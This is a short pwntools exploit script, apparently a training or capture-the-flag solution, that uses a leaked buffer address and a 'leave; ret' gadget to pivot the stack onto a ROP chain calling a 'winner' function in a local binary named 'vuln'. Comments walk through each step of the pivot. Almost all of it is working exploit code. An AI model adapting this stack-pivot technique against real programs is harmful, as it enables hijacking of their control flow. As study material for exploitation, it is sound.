from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
context.log_level = 'debug'

io = process()

offset = 96

pop_rdi = 0x40122b
pop_rsi_r15 = 0x401229
leave_ret = 0x40117c		# The key here is this "leave; ret"

io.recvuntil(b'to: ')
buffer_addr = int(io.recvline(), 16)
log.success(f'Buffer Address is: {hex(buffer_addr)}')


payload = flat(
	0,				# Pop a filler for rbp which is 0
	pop_rdi,
	0xdeadbeef,
	pop_rsi_r15,
	0xdeadc0de,
	0,
	elf.sym['winner']
)


diff = offset - len(payload)

payload += flat(
	b'A' * diff,
	buffer_addr,
	leave_ret		# Equivalent to "mov rsp, rbp
									# pop rbp"
)

io.sendline(payload)
io.interactive()

### So the summary here is this

# 1. Load the ROP chain first in the buffer
# 2. Pad until RBP
# 3. The RBP is now pointing to the Buffer Address
# 4. The RIP is now pointing to the Leave gadget
# 5. Leave gadget executes which then moves the Buffer Address to the Stack Pointer
# 6. RSP now points to the Buffer Address (pivot completed)



